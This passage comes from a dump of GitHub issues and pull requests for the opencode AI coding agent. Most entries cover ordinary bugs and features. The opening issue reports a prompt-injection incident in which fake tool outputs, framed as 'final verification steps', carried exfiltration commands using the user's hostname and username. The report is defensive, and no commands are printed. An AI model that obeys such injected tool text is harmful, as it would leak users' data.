- Fake tool outputs framed as "final verification steps" containing
  exfiltration commands using the user's hostname/username

Nothing was executed and a full forensic audit afterwards found no compromise:
no injected strings anywhere on the filesystem outside opencode's own session
records, no persistence (cron/systemd/ld.so.preload), no rogue listeners, no
new SUID binaries, no rogue logins. Impact is therefore prompt-injection safety
and UX confusion, not system compromise.

## Additional Context

- The injected strings exist only in `~/.local/share/opencode/log/opencode.log`
  and `opencode.db-wal` — i.e., the session transcript records themselves,
  confirming they were injected into the conversation stream rather than read
  from any file.
- The session was fully local: no plugins, no MCP servers, no web content tools
  other than built-in search/fetch (not used near the events).
- Frequency: intermittent, repeated within one session; cause unknown.
- Workarounds: explicit system-prompt refusals worked; no configuration change
  made the injections stop.

issues.title: [FEATURE]: Let injected text parts opt into markdown rendering in the TUI
issues.body:
### Feature hasn't been suggested before.

- [x] I have verified this feature I'm about to request hasn't been suggested before.

### Describe the enhancement you want to request

### Problem

A plugin or a tool that posts into a session through `session.prompt` has no way to get its text rendered. Everything sent that way becomes a text part on a user message, and the TUI renders user text through a plain `<text>` node while the assistant path renders through `<markdown>`:

```
packages/tui/src/routes/session/index.tsx
  1420  <text fg={theme.text}>{text()}</text>             // UserMessage
  1700  <markdown ... content={props.part.text.trim()} />  // TextPart, typed message: AssistantMessage
```

So a plugin that reports status back into the session shows raw markup on screen, sitting next to assistant output that is rendered. The case I hit is a background agent plugin posting its completion notice into the parent session: headings, bold and fenced code all arrive literally.

The only lever a plugin has today is `synthetic: true`, which hides the part from the message bubble. That is the right call for text meant only for the model, and it does not help when the text is also meant for the person watching.

### Prior issues

#5675, #12791 and #21510 all asked for markdown in user messages and were closed. On #5675 a maintainer answered that plain user prompts are intentional, with the door left open. I read that as correct for typed prompts: rendering markdown over what someone typed would eat characters from their own words when they echo back. This request is narrower and does not touch that.

### Proposal

Let a text part opt in with `metadata.render` set to `"markdown"`, and render only those through the markdown component. Parts without the flag keep rendering as they do now.

`TextPartInput` already carries `metadata`, and `resolvePart` in `packages/opencode/src/session/prompt.ts:992` spreads the input part into the stored part, so the flag already survives the round trip. The change fits inside the TUI with no schema or server work.

I have this working with tests and can open the PR. CONTRIBUTING asks for a design review before UI work, so I am raising it here first. If you would rather have a different key, a dedicated part type, or a separate surface for plugin status, tell me which and I will build that instead.

### Describe the enhancement you want to request

## Problem

Currently, when a single project needs to be opened or worked on from multiple directories, users may need local workaround flows such as `splitting-opencode-projects`. This adds friction and makes multi-directory workflows feel like something users have to manually adapt around instead of something opencode supports directly.

## Use case

Some projects naturally span multiple local directories, for example:

- monorepos split across several working directories
- generated/distribution mirrors next to source repositories
- multiple worktrees for parallel feature work
- related project folders that should share one opencode project/session context

In these cases, it would be useful for opencode to treat several directories as belonging to the same project identity.

## Requested behavior

Allow a project to be opened from multiple configured directories without requiring a local skill/workaround.

Possible approaches:

- Support multiple root paths for a single project
- Let users define project aliases that map several directories to the same project
- Allow session/project identity to be configured independently from the current working directory
- Provide first-class support for multi-directory or multi-worktree project contexts

## Expected benefit

This would make opencode smoother for users working with monorepos, mirrors, generated repos, and parallel worktrees. It would also reduce the need for custom local skills that compensate for project-directory limitations.

issues.title: [FEATURE]: Detect Mermaid diagrams in untagged fences, not only ```mermaid
issues.body:
### Feature hasn't been suggested before.

- [X] I checked #39816 (closed) and #40508 (open). Both cover *rendering* Mermaid; neither mentions detection of untagged fences, which is what this asks for.

### Describe the enhancement you want to request

`decorateMermaid` (from the merged, unreleased #43024) only acts on tagged fences:

```js
if (!code.classList.contains("language-mermaid")) {
  clearMermaid(wrapper)
  return
}
```

Correct by the letter — but models often don't tag the fence, even when explicitly asked for a Mermaid diagram.

**Measured** across the stored sessions of one instance (`opencode-ai@1.18.13`, Nemotron 3 Ultra 550B):

| fence | count |
|---|---|
| ` ``` ` (untagged) | **50** |
| ` ```text ` | **26** |
| ` ```mermaid ` | 22 |
| ` ```bash ` | 2 |

Not every untagged block is a diagram. But the diagrams that were there arrived untagged more often than tagged, and the user just sees a code block — with no way to tell whether the feature is missing or the tag is.

**The mechanism is already in the PR.** `renderMermaidSvg` does:

```js
if (!(await mermaid.parse(source, { suppressErrors: true }))) return
```

That alone identifies a diagram; non-diagram code doesn't parse. So the class check could be relaxed rather than replaced — attempt untagged (and `text`) blocks too and let `parse` decide, keeping the fast path for tagged ones. Cost is one suppressed parse per candidate, and it can be limited to `complete` blocks, which the code already distinguishes, so streaming is unaffected.

I first tried matching the first word against Mermaid's diagram keywords. It works, but ages badly — every new diagram type has to be added by hand. `parse` always knows.

**Caveat:** I haven't run your build; #43024 is merged but not in a published release (latest `1.18.18`, 2026-08-13). This comes from reading the diff. The measurement is from our own sessions and stands on its own.

issues.title: TUI: question tool prompt not visible mid-stream — must interrupt to see it (Solid store key-addition reactivity gap)
issues.body:
## Summary

In the opencode TUI (macOS Terminal), when the assistant calls the `question` tool mid-response while tokens are still streaming, the question prompt is **NOT visible** to the user. The user must interrupt (Ctrl+C); only then does the question appear.

## Root cause (corrected after live debugging)

**A user-installed global plugin (`~/.config/opencode/plugins/notify.ts`) blocks tool execution on a synchronous macOS desktop notification.**

The notify plugin registers a `tool.execute.before` hook that special-cases the `question` tool:

```ts
"tool.execute.before": async (input) => {
  if (input.tool === "question") {
    applyRuntimeSessionStatusTransition(...)
    await notifyQuestionIfNeeded(...)   // blocks here
  }
}
```

`notifyQuestionIfNeeded` → `handleQuestionAsked` → `sendDesktopNotification` → `sendMacOSAlerterNotification` → `Bun.spawn(["/opt/homebrew/bin/alerter", ...])` → `await process.exited`.

`alerter` is a blocking macOS notification tool — it does not exit until the user dismisses the notification. This blocks `plugin.trigger("tool.execute.before")`, so the question tool's `execute` body never runs, `Question.ask` never runs, `Event.Asked` is never published, the `question.asked` SSE event is never emitted, and the TUI never renders the prompt. On interrupt, the worker is killed → alerter dies → the blocked await rejects → the tool aborts. The "appears after interrupt" was the abort path, not a recovery path.

### Why `bash`/`read`/`grep` tools worked
The notify plugin's hook only special-cases `input.tool === "question"`. For all other tools the hook returns immediately.

### What was disproved
- **"Solid store key-addition reactivity gap"** (original hypothesis) — WRONG. A unit test proved Solid 1.9.10 recomputes the `questions()` memo on key addition. The store reactivity is fine; the event simply never arrived because the tool body never ran.
- **"SSE events unreliable mid-stream"** — WRONG. The event was never emitted; the server-side `Question.ask` (which publishes `Event.Asked`) never executed.
- **16ms event batching** — bounded, not the cause.

### Corroborating evidence
- `globalAskCount` counter in `Question.ask` stayed `0` during repro — the function never ran.
- `Tool.execute` wrapper fired for `bash` but never for `question` — the tool body was never reached.
- The blocking hook was identified as hook#11 (idx 11/12, keys `[tool.execute.before, event]`) via per-hook tracing in `plugin.trigger`.

## Defense-in-depth fix (this PR)

The user-side fix (changing `await` to `void` in the notify plugin) is outside this repo. However, the TUI currently has **no recovery path** for a genuinely missed `question.asked`/`permission.asked` SSE event, unlike the CLI transport which polls `question.list` as a fallback (`packages/opencode/src/cli/cmd/run/stream.transport.ts:556-598`). This PR adds the same defense-in-depth to the TUI so a missed event (network blip, slow hydration, plugin misbehavior) does not leave the prompt invisible.

### Changes
1. **`packages/tui/src/context/sync.tsx`** — `recoverPending(kind, sessionID, partID, messageID)`: when a tool part is `running` and the corresponding `question`/`permission` store key is empty, poll the v1 `question.list`/`permission.list` endpoints every 250ms until the prompt appears, the part finishes, or the context unmounts. Mirrors the CLI's `recoverQuestion`. Gated on `permission.mode !== "auto"` for the permission branch (auto mode auto-replies and never stores). Also extends `sync.session.sync` to pre-initialize the keys on session open (cold-start).
2. **`packages/tui/src/context/sdk.tsx`** — bypass the 16ms event batch for `question.asked`/`question.replied`/`question.rejected`/`permission.asked`/`permission.replied` so they flush immediately.
3. **Tests** — 4 integration tests (`sync-recovery.test.tsx`) and 4 unit tests (`solid-reactivity.test.ts`).

## Environment

- opencode: `1.18.15` (dev branch, HEAD `4e81a0b`)
- Interface: TUI (macOS Terminal)
- OS: macOS (Darwin)

## Repro

1. Install the notify plugin (or any plugin with a blocking `tool.execute.before` hook for the `question` tool).
2. Start a TUI session with a prompt that causes the assistant to call `question` mid-response.
3. Observe no question prompt is visible; the stream appears stuck.
4. Press Ctrl+C — the question appears (abort path).

## Will submit PR

Yes — defense-in-depth TUI recovery, matching the CLI transport's existing pattern.

issues.title: [FEATURE]:Performance issue: Context cache invalidation when switching modes or during compaction
issues.body:
### Feature hasn't been suggested before.

- [x] I have verified this feature I'm about to request hasn't been suggested before.

### Describe the enhancement you want to request

I am experiencing significant performance issues when using OpenCode with local LLMs (inference engines like vLLM or Ollama). The context cache prefix is frequently invalidated, forcing the engine to reprocess the entire conversation history, which is very slow on local hardware.
According to technical analysis (e.g., tests conducted by the Nicefox YouTube channel), OpenCode breaks the cache for several reasons:

    Tool Switching: When switching between "Plan" and "Build" modes, the list of available tools changes. Since tools are part of the request prefix, this modification invalidates the cache.
    History Modification: Instead of only appending new messages, OpenCode sometimes modifies previous messages in the history (for example, adding/removing "system reminders" about the current mode). Any change in the middle of the message history forces a full reprocessing of the context.
    Compaction: The conversation compaction process does not seem to preserve the cache prefix.

Expected Behavior: The tools and the system prompt should remain constant (or be managed incrementally) across different modes to allow the inference engine to reuse the cached prefix. Previous messages should not be altered once they are part of the context.
Comment reproduire le bug ?


Pour prouver que le cache est "cassé", vous pouvez suivre ce protocole expérimental décrit dans les sources :

    Préparation : Utilisez un moteur d'inférence local (comme vLLM) et, si possible, un proxy (comme LiteLLM) qui permet de voir si le préfixe de cache est réutilisé ou si le texte est "re-processé".
    Étape 1 (Mode Plan) : Démarrez une session en mode Plan et envoyez un message simple (par exemple : "Bonjour"). Notez le temps de réponse.
    Étape 2 (Bascule de mode) : Passez en mode Build et renvoyez un message (par exemple : "Peux-tu m'aider ?").
        Observation : Vous remarquerez que le moteur d'IA doit analyser à nouveau toute la conversation car OpenCode a changé la liste des outils disponibles entre les deux modes, ce qui "invalide" le cache.
    Étape 3 (Vérification de l'historique) : Regardez les requêtes envoyées. Vous constaterez qu'OpenCode modifie souvent le contenu de votre premier message (en y insérant des rappels système au lieu de les mettre dans un nouveau message), ce qui change le "hash" du préfixe et casse le cache.
    Étape 4 (Compaction) : Continuez la conversation jusqu'à ce que l'outil déclenche automatiquement le compactage de l'historique. Vous verrez que le temps de traitement devient extrêmement long car l'intégralité du contexte est à nouveau recalculée.

issues.title: Web UI: session tab switch fails with InvalidRequestError after scrolling back through history
issues.body:
### Description

In the V2 web UI, scrolling back through a long session and then switching away and back to that session tab throws `Unknown error`, with:

```
{
  "_tag": "InvalidRequestError",
  "message": "Expected a value less than or equal to 200, got 400\n  at [\"limit\"]",
  "kind": "Query"
}
```

The client asks the message endpoint for more than it is allowed to. `SessionMessagesQuery` caps `limit` at 200 (`packages/protocol/src/groups/message.ts`), but the app tracks how many messages it currently has retained for a session and replays that count as the request limit:

- `setMeta("limit", sessionID, messages.length)` stores the retained count (`packages/app/src/context/server-session.ts`)
- `sync()` re-requests with `loadMessages(sessionID, options?.messageLimit ?? meta.limit[sessionID] ?? initialMessagePageSize)`
- `fetchMessages` passes that straight to `messageApi.list` with no clamp

History pages are 200 at a time, so after scrolling back the retained count goes past 200 and every later re-sync sends an out-of-range limit. Switching back to a session tab triggers exactly that re-sync (`packages/app/src/pages/session/timeline/model.ts` calls `sync(id)` / `sync(id, { force: true })`), which is why it looks like a multi-tab problem.

Still present on `dev` as of 9b0dd36cd.

### Steps to reproduce

1. Open a session with more than 400 messages in the web UI (`opencode serve`).
2. Scroll back through the history far enough to load two extra pages.
3. Switch to another session tab, then switch back.
4. The timeline fails with `Unknown error` / `InvalidRequestError`.

### OpenCode version

1.18.18

### Operating System

Ubuntu (WSL2, Linux 6.18.33.2-microsoft-standard-WSL2)

issues.title: [FEATURE]: Expose queued/injected delivery mode on user messages so agents may preserve in-progress multi-step plans
issues.body:
### Feature hasn't been suggested before.

- [x] I have verified this feature I'm about to request hasn't been suggested before.

### Describe the enhancement you want to request

### Background

`followup: "queue"` is intentionally forced to `"steer"` mode (#24580), so messages the user sends while the agent is busy may be drained into the active loop's next model input. Downstream ordering issues are tracked in #28375 / #15696 (closed as intended), and UI-side queue/steering UX is requested in #24298, #38832, #37381 — but none of these address the **model-facing** side.

### Problem

When an injected (steer) message arrives mid-task, the model receives it with no indication that it was queued while the agent was working. The message may appear indistinguishable from a fresh standalone instruction, in which case the agent could treat it as a full replacement of the current work item. Partially-executed multi-step plans may then be silently dropped, without any signal that outstanding steps remain.

Possible failure mode:

1. Agent is asked to perform a multi-step task (e.g. "push all 3 submodules to AUR, then run the sync workflow").
2. While a tool call for step 1 is running, the user sends a correction that only affects a later step ("use `gh` to trigger the sync") (The model was planning to locally simulate it).
3. The agent completes the running step, then consumes the injected message as the entire next instruction — potentially abandoning the remaining pushes and jumping straight to the `gh` command. Whether the other two got pushed may then go unnoticed until the user asks.

### Existing mitigation on the agent side (and its limits)

OpenCode agents already have a persistent task-list tool (`todowrite`) that survives across turns and would normally surface "two pushes still pending" after an interruption. In this incident it was **not** used, so the outstanding steps existed only in the agent's previous reply and were lost. This suggests two compounding gaps rather than a single defect:

- An agent that fails to materialize its plan into `todowrite` has no way to resume after an injected message replaces its current instruction.
- Even with `todowrite`, the injected message carries no hint that it is a *correction of an ongoing task* rather than a fresh assignment, so the agent has no strong signal to consult its pending list first.

The requested metadata would make the second gap addressable; the first remains a model-behavior concern, but the metadata gives agents a stable reason to reconcile with their task list instead of assuming a full reset.

### Requested enhancement

Expose the delivery mode / queue-origin of user messages to the model, so each incoming user message could be distinguished:

- `delivery: "enqueue"` / `delivery: "immediate"` (steer) — or a boolean such as `queued: true` — carried as message metadata (e.g. `chat.message` fields) so agents might detect an injected correction.

### Benefits

- Agents could weigh an injected correction against an in-progress plan instead of assuming a full reset: finishing or explicitly deferring outstanding steps before applying the correction.
- More predictable course-correction ("I already queued a corrective message") without canceling the run or losing work — the exact use case in #24298.
- Could enable follow-up tooling on top (e.g. `opencode-queue`-style plugins) to tag queued entries, since a stable signal currently doesn't exist.
- Low blast radius: purely additive metadata; existing FIFO/steer delivery semantics should be unchanged.

### Example payload change

```ts
// chat.message (user)
{
  condition: "text",
  role: "user",
  content: "...",
  // new:
  delivery: "immediate", // "enqueue" | "immediate"; absent = fresh reply
  queued: true,          // true when sent while a turn was active
}
```

prs.title: fix(core): bound skill discovery and watches
prs.body:
### Issue for this PR

Closes #55367
Closes #45961
Closes #51080

Supersedes #55479 and #55234. Both authors are credited as co-authors on the commit.

### Type of change

- [x] Bug fix
- [ ] New feature
- [ ] Refactor / code improvement
- [ ] Documentation

### What does this PR do?

Skill discovery used `{*.md,**/SKILL.md}` with symlinks followed, no depth limit and no exclusions. It descended into `node_modules`, and symlink cycles crashed it. When a found `SKILL.md` resolved outside the watched sources, the plugin recursively watched the file's parent directory. home-manager links `SKILL.md` files straight into `/nix/store`, so that parent was the whole store: about 1.4M directories, enough to exhaust `max_user_watches`.

The skill and compatibility plugins now share `SkillScan.scan`, a breadth-first walk:

- A directory containing `SKILL.md` is one skill, and the walk does not search inside it.
- Loose `*.md` files still count only at the source root.
- Hidden entries and `node_modules` are skipped.
- The walk stops six directories below the source root, which also ends symlink cycles.

Watches are unchanged except for two things:

- Recursive skill watches ignore hidden entries and `node_modules`.
- A skill file outside the watched sources gets a file watch instead of a recursive watch on its parent directory.

A shared `FSUtil.ignoredDirectories` list (`node_modules`, `.git`, `.venv`, `venv`, `__pycache__`) now backs the skill scan, the skill and config directory watches, and the supporting-file sample `Skill.prepare` builds for a loaded skill, which previously globbed everything inside the skill directory. `Glob.Options` gains `ignore` for this.

Behavior changes: a `SKILL.md` inside another skill's directory, skills under hidden directories, and skills more than six directories deep no longer load. The skills docs describe the rules and fix a stale note about root `SKILL.md` IDs.

### How did you verify your code works?

- `packages/core`: `bun typecheck` and the config and skill tests pass (254). `packages/util` tests pass. Root `bun run check` passes.

prs.title: fix(server): answer requests that arrive before the request listener is attached
prs.body:
### Issue for this PR

Closes #56641

### Type of change

- [x] Bug fix
- [ ] New feature
- [ ] Refactor / code improvement
- [ ] Documentation

### What does this PR do?

`NodeHttpServer.layer` starts listening before `HttpRouter.serve` adds the `"request"` listener. The route layers are built in between, which takes a few hundred ms. A request that arrives in that window is emitted to no listener, so Node drops it and the client waits on an open socket forever.

`serverLayer` now registers a temporary `"request"` listener that holds early requests. When the real listener is added (detected with `newListener`), the temporary one is removed and the held requests are re-emitted on the next tick. `newListener` fires before the listener is actually added, which is why the replay waits a tick. After startup there is no extra listener and no per-request overhead.

Targets `v1` because that is where 1.x is released from. `dev` already avoids this by answering 503 until the routes are ready.

### How did you verify your code works?

- Added a test in `httpapi-listen.test.ts` that starts `Server.listen` and sends a request on the first accepted connection. It times out without the fix and passes with it.
- `bun test test/server/httpapi-listen.test.ts`: 12 pass, run 3 times. `bun run typecheck` passes. In `test/server/`, `project-copy.test.ts` fails the same way with and without this change; everything else passes.

prs.title: refactor(schema): rename provider replay data to native
prs.body:
## Problem

The same provider-owned replay data had five names across messages and events: `state`, `providerState`, `providerResultState`, `resultState`, plus the `ProviderState` type. On tool parts, `state` already means the tool status (`streaming`, `running`, `completed`, `error`), while on text and reasoning parts `state` meant provider data.

## Change

Every field holding provider replay data is now `native`, plus `nativeResult` for provider-executed tool results. The type is `SessionMessage.Native`.

```diff
 Session.Message.Assistant
-  providerState            # step finish diagnostics
+  native
   content[]
     text
-      state
+      native
     reasoning
-      state
+      native
     tool
-      providerState
-      providerResultState
+      native
+      nativeResult
       state                # tool status, unchanged

 Session.Message.Compaction (completed)
-  providerState
+  native
```

| Event | Before | After |
|---|---|---|
| `session.text.ended`, `session.reasoning.started`, `session.reasoning.ended`, `session.tool.called` | `state` | `native` |
| `session.tool.success`, `session.tool.failed` | `resultState` | `nativeResult` |
| `session.step.ended`, `session.step.failed`, `session.compaction.ended` | `providerState` | `native` |

Durable event versions are unchanged.

### Existing data

No database migration. Stored events and projected messages keep whatever shape they were written in, and `SessionLegacy` upgrades the old field names when they are read:

```text
stored event row    ──► Bus decode (log, replay) ──► SessionLegacy.event(type, data) ──► schema decode
session_message row ──► history / projector / revert ──► SessionLegacy.message(type, data) ──► schema decode
```

The projector re-encodes a message whenever an event updates it, so a legacy row is written back in the current shape the next time it is touched. Rows that are never touched keep the old names and are upgraded on every read.

The CLI `--format json` output keeps its V1-style `providerCall: { executed, state }` and `providerResult: { executed, state }` keys; only the values' source changed.

## Out of scope

- **Older session exports:** the experimental `session.import` endpoint and `opencode session import` decode against the current schema, so a JSON export written by an older version imports without its native data. Messages still import; replay to the original model may lose reasoning signatures.

## Verification

- `packages/core/test/session-projector.test.ts` "reads native data stored under its pre-v2.1 names": inserts legacy-shaped `session_message` rows and `event` rows directly, then checks that `SessionStore.messages` and `Bus.log` return `native` / `nativeResult`, and that the next projection rewrites the row in the current shape. It fails with the upgrade disabled.
- `bun typecheck` passes in schema, protocol, core, client, cli, tui, server, plugin, sdk, session-ui and app. The only remaining errors were already on `v2.1`: `tui/dialog-workspaces.tsx`, `tui/prompt/autocomplete.tsx`, `app/runtime/server/persistence.ts` and `app/settings/model.tsx`.
- **Tests:**
  - core `bun test`: 6639 pass, 8 fail. The 8 also fail without this change on macOS: 7 bash-syntax ShellTool tests, and `test/preload.test.ts` "isolates global home and XDG roots", which also fails on `v2.1`.
  - schema: 69 pass.
  - client: 229 pass.
  - server: 83 pass.
  - cli `test/run` and `test/acp`: 111 pass.
  - tui `data.test.tsx`, `test/mini` and `app-lifecycle.test.tsx`: 497 pass.
- `check:generated` passes in packages/protocol, packages/client and services/www.

prs.title: fix(core): recover worktree removal blocked by cached locations
prs.body:
### Issue for this PR

Closes #51172

### Type of change

- [x] Bug fix
- [ ] New feature
- [ ] Refactor / code improvement
- [ ] Documentation

### What does this PR do?

On Windows, removing a worktree that has been used as a location fails halfway. A local MCP server started with the worktree as its cwd keeps the directory in use, so `git worktree remove` deletes the checkout and `.git/worktrees/<id>` but not the root. The row stays, and every retry fails with `Worktree directory unavailable`.

- `Worktree.remove` still tries the strategy first. If that fails for a reason `force` wouldn't fix, it invalidates the cached local locations at or inside the worktree (the same thing `debug.location.evict` does; closing an idle location stops its MCP servers) and retries once. If the retry also fails, the original error is returned and the retry error is logged. Refusals that need force (git or plugin `forceRequired`) don't touch any location, and on Linux/macOS the first attempt succeeds, so nothing changes there.
- The git strategy treats an empty directory as the leftover of a partial removal and deletes it, since a real checkout always has `.git`. Non-empty directories are left alone. This also lets a retry succeed once some other process that held the directory has exited.

Known limits, same as before this change:
- An active session's location is only detached by invalidation, so it can keep holding the directory until the session ends. I asked in the issue whether removal should reject or interrupt active sessions.
- A locked file inside the worktree (for example an MCP server running from the worktree's `.venv`) still leaves a non-empty leftover.
- A plugin removing the worktree it is loaded in is not handled.
- The release-and-retry also runs for failures that releasing can't fix (for example a locked worktree). Happy to limit it to Windows if you prefer.

### How did you verify your code works?

- New tests in `packages/core/test/worktree.test.ts`, which fail before this change and pass after:
  - locations inside the worktree are released only after a failed first attempt, then the removal is retried;
  - a dirty git worktree and a plugin `forceRequired` refusal release nothing;
  - an empty leftover (outside and inside the repo) is cleared on retry;
  - a non-empty leftover is kept.
  
  `bun run test test/worktree.test.ts` in `packages/core`: 41 pass. `location-layer`, `location-activity` and `git` tests also pass.
- On Windows 11 (git 2.55), I ran the issue's reproduction script against `serve` from this branch with a stub stdio MCP server. Before: `DELETE /api/worktree` → 400 `Permission denied`, an empty directory and the row are left, and the retry → 400 `Worktree directory unavailable`. After: 204, and the directory and row are gone. With an external process holding the directory, the first delete still reports git's error, and a retry after that process exits → 204.
- The script in the issue uses the old `mcp: { <name>: ... }` config. Current `v2` needs `mcp.servers`, otherwise no MCP server starts and the bug doesn't show.

prs.title: fix(session-ui): optimize incremental markdown projection
prs.body:
### Issue for this PR

Closes #56202

### Type of change

- [x] Bug fix
- [ ] New feature
- [ ] Refactor / code improvement
- [ ] Documentation

### What does this PR do?

Ordinary Markdown streaming re-lexes the entire accumulated message text on every delta. `project()` in `packages/session-ui/src/components/markdown-stream.ts` only had a fast path for a still-open fenced code tail; for prose, lists, and tables it rebuilt the tail by re-lexing everything, so a stream of `n` deltas over a message of final length `L` is O(n·L) ≈ O(L²) and the UI freezes on long responses.

This extends the incremental fast path to the live Markdown tail. While the last block is `mode: "live"`, `project()` appends the new delta to that block in place instead of re-lexing, preserving already-frozen completed blocks by object identity.

The relevant correctness fallbacks remain:

- the tail is re-projected (the tail only, not the whole message) when the delta introduces a blank-line boundary or when the tail is already parked at one; the boundary is checked on the join of the tail's last character and the delta, so a blank line split across two deltas is not missed;
- an open fence arriving inside a live tail switches it to `code` mode promptly so streaming highlighting engages;
- a late reference definition, a frozen display-math delimiter, or a non-append/truncation update falls back to a full re-lex;
- `heal` (remend) only touches the segment after the last blank-line boundary;
- `stream()` rebuilds the live tail's `raw` from the source text so a bare trailing list marker (for example `1. `) no longer corrupts later projections.

This also addresses the review note that a blank-line separator arriving across two deltas could leave an oversized tail unsplit.

### How did you verify your code works?

- `bun test src/components/markdown-stream.test.ts` in `packages/session-ui` — 54 pass / 0 fail.

prs.title: fix(core): report shell exit only after output is captured
prs.body:
## Problem

`Shell.finish()` set the terminal status (`exited` / `timeout`) before awaiting the output pump. During that window, `GET /api/shell/:id` already reported `exited` while the output file was still empty or partial, so a client that polls `get` and then reads `output` could get nothing back.

Reproduced over HTTP against the in-process server: polling `shell.get` until non-running, then reading `shell.output` for `printf hello-world`, returned `""` in 10 of 40 runs.

## Fix

Split "how did it end" from "publish that it ended":

- An `ended` `Deferred` records the outcome. The process exit and the timeout timer both complete it, and the first one wins. The timer records the timeout and starts the kill in one step that cannot be interrupted. The kill itself runs detached, so `remove` and teardown never wait on a dying process.
- One fiber, after the exit watcher, awaits `ended`, then waits for captured output to drain, and only then updates `info`, resolves waiters, publishes `shell.exited`, and runs retention.
- `time.completed` is still the moment the process ended or the timeout fired.

Behavior change: when a timed-out process ignores SIGTERM, `get` and `list` keep reporting `running` until it is force-killed (up to about 3s), and retiming is ignored during that window. Previously status switched to `timeout` as soon as the timer fired, even though the process was still alive and its output incomplete.

## Verification

- Local scratch tests, not committed:
  - With a deterministic fake process that exits while its last output chunk is held back, `get` stays `running` until the chunk arrives. The same check fails on `dev`.
  - Retiming after a timeout still resolves `wait` with `timeout`.
- HTTP repro: 10/40 empty reads before, 0/40 after. A `timeout: 200` command reports `timeout` after about 220ms. With a process that ignores SIGTERM, `time.completed` matches when the timeout fired, and `remove` during the kill returns in a few ms.
- Core shell tests: same results as `dev`. The 7 bash-syntax failures on macOS also fail on `dev`.
- `bun typecheck` in `packages/core` is clean.

prs.title: feat: add per-folder notebook memory with mid-task note attach and interactive review
prs.body:
### Issue for this PR

Closes #43068 (per-folder notebook memory); also related to #16077 (persistent session memory). Implements per-project memory as `.note.yaml` files with `notes_get`/`notes_commit`, mid-task leaf-note attach, and a save-learnings nudge.

### Type of change

- [x] New feature

### What does this PR do?

Adds per-folder notebook memory for the agent. Each folder can carry a `.note.yaml` with a folder summary, per-file entries, and cross-file relations, grounded in `based_on` source fingerprints with freshness badges (✓/⚠/✗).

- `notes_get` reads the ancestor-chain memory for a path, or keyword-searches all notebooks; bare-directory targets are handled as leaves (fixes the old "No memory on this path yet" for directories) and relations-only notebooks are no longer skipped.
- `notes_commit` writes summaries/entries/relations with `PermissionV2` (`write-notes`) approval and a real diff, never auto-approved even in `--auto`.
- A concreteness gate rejects summaries that name no concrete symbols (classes/functions/modules), so saved notes are usable instead of vague.
- `NotebookAttach` prepends the relevant per-file note to `read`/`edit`/`write`/`apply_patch` output on first touch in a session, so leaf memory reaches the model mid-task. This is the opinionated part, so it is opt-out via `experimental.notebook.attach = false`.
- The injected digest states it only samples memory (up to 2 entries/folder) and points the model at `notes_get` before answering general project questions.
- Save-learnings nudge after exploring without saving; clears on commit.

Why attach in the SessionRunner instead of the registry: `ToolRegistry` deliberately has no FSUtil/Location deps and is a standalone unit-test boundary; the Location-scoped runner already owns the step lifecycle and notebook evidence, so prepending a bounded text note to the published tool result fits there with no new cross-cutting seams.

### How did you verify your code works?

- `bun typecheck` green in core, app, session-ui, tui.
- Core tests for the concreteness gate, `prependNote`, directory-target `notes_get`, and notebook tools/memory/evidence all pass (61 tests), plus the portable V1 plugin suite.

### Screenshots / recordings

N/A here — UI adds a save-learnings button and a permission diff view; can attach once the CI build is visible.

### Checklist

- [x] I have tested my changes locally
- [x] I have not included unrelated changes in this PR

Splits: interactive review helper in #43059, locale keys in #43066.

prs.title: fix(i18n): remove dead locale keys
prs.body:
### Issue for this PR

Closes #56610

### Type of change

- [x] Bug fix
- [ ] New feature
- [ ] Refactor / code improvement
- [ ] Documentation

### What does this PR do?

Removes 116 locale entries that no longer correspond to any key in English.

19 dictionaries still carried translations for four key families that `en.ts` no longer defines: `session.question.pending`, `session.background.runningCount`, `session.background.shell` and `session.background.subagent`. Every one of the 116 entries is a CLDR plural variant (`few`, `many`, `zero` or `two`) of those families.

None of them is reachable. A locale lookup only ever asks for a key the English dictionary defines, and the families were removed from `en.ts` long ago, so nothing ever selects those strings. Nothing outside `runtime/i18n` references them either. `packages/ui` had none.

This is what blocks the subset assertion in #50835: "no locale defines a key English does not" cannot pass while the locales define families English does not have.

I kept this separate from #50835 on purpose. It is a mechanical deletion that needs no judgement about what the copy should say, so it can be reviewed and landed without waiting on the test it unblocks.

### How did you verify your code works?

- Every removed entry was confirmed against `en.ts` before deleting: none of the four families exists there, by plural family as well as by exact key.
- `grep` across `packages/app/src`, `packages/core/src` and `packages/cli/src` finds no reference to any of the four names outside `runtime/i18n`.
- After the removal, a re-scan of all 62 app locales and 61 ui locales reports zero remaining unknown keys.
- `bun test src/runtime/i18n` in `packages/app`: 18 pass, 1 fail. That failure is pre-existing — `language.test.ts` cannot resolve `jsxDEV` from the locally installed solid-js — and reproduces identically with these changes stashed.
- `bun typecheck` reports the same 2 errors with and without the change. Note that `packages/ai` currently has 6 typecheck errors on `dev` itself, which is why the pre-push `bun run check` hook fails on a clean tree; I verified this on a stashed checkout rather than assuming.
- prettier clean on all 19 files.

### Screenshots / recordings

None. No user-visible change; these strings were already unreachable.

1. **Truncated diff marker** (#46138 follow-up): V2 caps diff output at a 10 MiB total budget, but a withheld patch looked identical to a complete one in stored rows.
